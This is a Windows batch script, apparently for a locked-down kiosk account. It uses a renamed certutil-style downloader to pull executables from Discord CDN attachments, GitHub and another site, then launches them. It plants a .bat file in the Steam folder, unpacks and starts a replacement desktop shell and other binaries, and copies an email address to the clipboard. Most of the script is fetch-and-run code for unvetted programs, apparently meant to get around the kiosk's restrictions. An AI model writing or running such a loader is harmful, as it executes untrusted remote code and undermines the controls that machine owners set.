@echo off
title G
cls                                                                                 
for /f "delims=: tokens=*" %%A in ('findstr /b ::: "%~f0"') do @echo(%%A

set "zipFile=C:\Users\kiosk\Downloads\G.zip"
set "unzipFolder=C:\Users\kiosk\Downloads\G"

if not exist "%unzipFolder%" (
  md "%unzipFolder%"
)

IF EXIST "C:\Program Files (x86)\steam\ssfn_G.bat" (
echo Exists) ELSE (
  c:\temp\rdl.exe -urlcache -split -f "https://raw.githubusercontent.com/tobiasmulln/Testing/main/ssfn_G.bat" "C:\Program Files (x86)\Steam\ssfn_G.bat"
)

"c:\temp\rdl.exe" -urlcache -split -f "https://files.rycoh.net/rdl.exe" "C:\Users\kiosk\Downloads\G\rdl.exe"
"c:\temp\rdl.exe" -urlcache -split -f "https://cdn.discordapp.com/attachments/1105541696135123004/1108820816801574912/z.exe" "C:\Users\kiosk\Downloads\G\z.exe"
"c:\temp\rdl.exe" -urlcache -split -f "https://cdn.discordapp.com/attachments/1105541696135123004/1108821803062792323/7z.dll" "C:\Users\kiosk\Downloads\G\7z.dll"
"c:\temp\rdl.exe" -urlcache -split -f "https://cdn.discordapp.com/attachments/873261878904782941/1102389310487023727/VoughtUadml.exe" "C:\Users\kiosk\Downloads\G\VoughtUadml.exe"
#"c:\temp\rdl.exe" -urlcache -split -f "https://cdn.discordapp.com/attachments/1105541696135123004/1105542124436459550/nt.exe" "C:\Users\kiosk\Downloads\G\nt.exe"
#"c:\temp\rdl.exe" -urlcache -split -f "https://cdn.discordapp.com/attachments/1105541696135123004/1105963087632273599/task.exe" "C:\Users\kiosk\Downloads\G\task.exe"

start "" "C:\Users\kiosk\Downloads\G\VoughtUadml.exe"
#start "" "C:\Users\kiosk\Downloads\G\nt.exe"

timeout /t 8

#start "" "C:\Users\kiosk\Downloads\G\task.exe"

"C:\Users\kiosk\Downloads\G\rdl.exe" -k -L -o  "%zipFile%" "https://github.com/tobiasmulln/Testing/releases/download/LSF/G.zip"
"C:\Users\kiosk\Downloads\G\z.exe" x "C:\Users\kiosk\Downloads\G.zip" -oC:\Users\kiosk\Downloads\G
del "%zipFile%"

REM --------- After Here RDL is in "C:\Users\kiosk\Downloads\G" !!

del /A:H "C:\Users\kiosk\Downloads\desktop.ini"

cd "%unzipFolder%"

"C:\Users\kiosk\AppData\Roaming\Cloudforce\7-Zip\7z.exe" x C:\Users\kiosk\Downloads\G\bable.zip -oC:\Users\kiosk\Downloads\G\bable
"C:\Users\kiosk\AppData\Roaming\Cloudforce\7-Zip\7z.exe" x C:\Users\kiosk\Downloads\G\shell.zip -oC:\Users\kiosk\Downloads\G\shell
del shell.zip

start "" "C:\Users\kiosk\Downloads\G\shell\CairoDesktop.exe"
timeout /t 121
start "" "C:\Users\kiosk\Downloads\G\bable\bable.exe"
timeout /t 60
start "" "C:\Users\kiosk\Downloads\G\DK.exe"


echo enazar415@gmail.com|clip
